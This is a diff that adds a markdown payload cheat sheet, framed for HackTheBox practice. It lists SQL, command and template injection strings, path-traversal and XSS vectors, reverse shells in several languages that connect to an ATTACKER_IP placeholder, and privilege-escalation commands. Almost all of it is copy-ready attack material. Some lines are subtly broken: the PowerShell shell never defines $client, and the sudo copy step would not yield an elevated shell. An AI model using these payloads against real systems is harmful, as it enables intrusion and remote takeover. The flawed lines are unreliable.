@@ -1,0 +1,116 @@
+# Common Payloads for HackTheBox Exploitation
+
+## SQL Injection Payloads
+
+### Basic Boolean-based
+' OR '1'='1
+' OR 1=1 --
+' OR 1=1 #
+admin' --
+admin' #
+' OR 'a'='a
+
+### Union-based
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT username,password FROM users --
+
+### Time-based Blind
+' AND SLEEP(5) --
+'; WAITFOR DELAY '00:00:05' --
+
+## Command Injection Payloads
+
+### Unix/Linux
+; whoami
+| whoami
+|| whoami
+& whoami
+`whoami`
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+
+### Windows
+; whoami
+| whoami
+& whoami
+`whoami`
+; type C:\windows\win.ini
+
+## Local File Inclusion Payloads
+
+### Basic Path Traversal
+../../../etc/passwd
+..\\..\\..\\windows\\win.ini
+....//....//....//etc/passwd
+
+### With Null Byte (older systems)
+../../../etc/passwd%00
+../../../etc/passwd%00.txt
+
+### With Filters Bypass
+..././../etc/passwd
+....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+## Cross-Site Scripting (XSS)
+
+### Basic
+<script>alert('XSS')</script>
+<img src=x onerror="alert('XSS')">
+<svg/onload=alert('XSS')>
+javascript:alert('XSS')
+
+### Event Handlers
+<input onfocus="alert('XSS')" autofocus>
+<body onload="alert('XSS')">
+
+## Remote Code Execution (Template Injection/Deserialization)
+
+### Server-Side Template Injection (SSTI)
+{{7*7}}
+#{7*7}
+<%= 7*7 %>
+${7*7}
+#{T(java.lang.Runtime).getRuntime().exec('whoami')}
+
+## Reverse Shell Payloads
+
+### Bash
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
+### Python
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+### PHP
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+### NC
+nc -e /bin/sh ATTACKER_IP PORT
+
+### PowerShell (Windows)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+## Privilege Escalation Payloads
+
+### SUID Exploitation
+find / -perm -4000 2>/dev/null  # Find SUID binaries
+find . -exec /bin/sh \;        # Escape from find
+
+### Sudo Misconfig
+sudo -l                        # List sudo permissions
+sudo /bin/bash                 # If sudo bash allowed
+sudo cp /bin/bash /tmp/bash && /tmp/bash -p  # Copy shell with elevated perms
+
+### Library Path Manipulation
+LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH /vulnerable/binary
+LD_PRELOAD=/tmp/inject.so /vulnerable/binary
+
+## Notes
+
+- Replace ATTACKER_IP and PORT with your actual listening IP and port
+- URL encode payloads if needed (for HTTP requests)
+- Test payloads in safe environments first
+- Document successful payloads for reference
